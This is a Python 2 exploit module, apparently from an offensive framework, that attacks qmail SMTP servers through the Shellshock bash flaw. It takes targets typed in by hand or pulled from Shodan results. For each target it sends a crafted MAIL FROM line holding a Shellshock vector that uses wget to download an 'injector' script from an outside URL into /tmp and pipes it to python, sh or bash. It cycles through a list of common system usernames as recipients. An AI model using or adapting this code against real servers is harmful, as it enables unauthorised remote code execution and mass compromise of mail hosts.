import sys
import time

sys.path.append('.')
from config import config
from tabulate import tabulate
import socket
class module(config):


####Init configuration####
    def __init__(self):
        self.config = config()
        self.cur = self.config.getCursor()
        self.con = self.config.getCon()
        self.targets=[]
        self.preExecution()
##########################

####User define information####
    def preExecution(self):
        while(True):
            option = raw_input("> ")
            if(option=="exit"):
                exit(0)

            if(option=="help"):

                print("set target URL:PORT --> Manual Target")
                print("clear targets       --> Show Targets in module")
                print("show targets        --> Clear Targets in module")
                print("use shodan          --> Targets from Shodan Results")
                print("exploit             --> Start atack")
                print("info                --> Show info of module")
                print("exit                --> Close Module")

            if(option.find("set target")>-1):
                data = option.split(" ")
                data = data[2].split(":");
                target = data[0]
                port = data[1]
                self.targets.append((0,target,port,"Manual","null"))

            if(option.find("use shodan")>-1):
                self.targets=self.config.getTargets();

            if(option=="clear targets"):
                self.targets=[]
                print("Clear Done")

            if(option=="show targets"):
                if(len(self.targets)!=0):
                        print tabulate(self.targets, ["id", "IP", "PORT", "Description"], tablefmt="grid")
                else:
                    print "No targets"

            if(option=="info"):
                print "[*] Module to exploit Shellshock in qmail smtp server"
                print "[*] by hdbreaker"

            if(option=="exploit"):
                self.exploit()
###################################

###Exploit c0de###
    def exploit(self):
        ###YOUR EXPLOIT CODE HERE###
        #All Posible Email Users
        emailUserList=["root","daemon","bin","sys","sync","games","man","lp","mail","news","uucp","proxy","www-data","backup","list","irc","gnats","nobody","libuuid","syslog","messagebus","usbmux","dnsmasq","avahi-autoipd","kernoops","rtkit","saned","whoopsie","speech-dispatcher","avahi","lightdm","colord","hplip","pulse","hdbreaker","sshd","postgres","debian-tor","shock","mysql","postfix","smmta","smmsp","dovecot","shock","qmaild","qmaill","qmailp","qmailq","qmailr","qmails","vpopmail","dovenull","iodine","usermetrics"]

        if(len(self.targets)!=0):
            #For all Targets (Individual or Shodan)
            for target in self.targets:
                print "################Try to connect "+target[1]+":"+str(target[2])+"################"
                #For all Users in All Targets
                for user in emailUserList:
                    #Tuple IP:PORT
                    address = (target[1],int(target[2]))

                    try:

                        ###MAGIC HERE###
                        s = self.socket(address)    #Create Socket
                        self.shellshock(s,user)     #Start Shellshock jobs for all posible email Usrs
                        s.close()
                    except:
                        s.close()
                        print "Connection Fail TimeOut!"
                        break

                print "**********DONE************"
                print ""
            print ""
            print "###############EXPLOIT COMPLETE WHAIT FOR SESSIONS###############"
        else:
            print "No targets found";

####def custom user functions (calleable from exploit())####
    def socket(self,address):
        s = ""
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect(address)
        except:
            print "Connection Fail\n"

        return s

    def shellshock(self,s,user):

        siteController="com;ar;net;org;gob;gov;mil;ddns;no-ip" #Filter Domain
        rcpt = ""
        if(self.config.getInjectorName()=="injector.py"):
            mailFrom = "mail from:<() { :;}; /usr/bin/wget "+self.config.getUrlInjector()+" -O /tmp/injector.py | /usr/bin/python /tmp/injector.py>" #Shellshock Vector
        if(self.config.getInjectorName()=="injector.sh"):
            mailFrom = "mail from:<() { :;}; /usr/bin/wget "+self.config.getUrlInjector()+" -O /tmp/injector.sh | /bin/sh /tmp/injector.sh>" #Shellshock Vector
        if(self.config.getInjectorName()=="injector.bash"):
            mailFrom = "mail from:<() { :;}; /usr/bin/wget "+self.config.getUrlInjector()+" -O /tmp/injector.bash | /bin/bash /tmp/injector.bash>" #Shellshock Vector

        subject = "Security Report."
        mailData ="Vulnerable."
        END = "."

        if(s!=""): #If Socket has been created
            data = s.recv(1024); #Test response of Server

            if(len(data)>0): #If Server Response
                #Start Exploit Operation
                s.send("helo me\r\n")
                header = str(s.recv(1024)).strip()
                header = header.split(" ")
                header = header[1]

                ##############In this block I Get the banner host rcpt##############
                if(header.find(".")>-1):
                    banner = header.split(".",1)[1]
                    if not(siteController.find(banner)>-1):
                        rcpt = "rcpt to:<"+user+"@"+header.split(".",1)[1]+">"
                    else:
                        rcpt = "rcpt to:<"+user+"@"+header+">"
                else:
                    rcpt = "rcpt to:<"+user+"@"+header+">"
                ####################################################################

                #######Init transaction with Qmail
                print "#Trying with USER: "+rcpt.replace("rcpt to:","")+"\n"
                s.send(mailFrom+"\r\n")
                #print rcpt
                s.send(rcpt+"\r\n")
                s.send("data\r\n")
                s.send(subject+"\r\n")
                s.send(mailData+"\r\n")
                s.send(END+"\r\n")
                time.sleep(0.200)
                print s.recv(1024)


        else:
            s.close()
            print "Connection Fail!"
#############################################################

#####Init Module#####
start = module()
#####################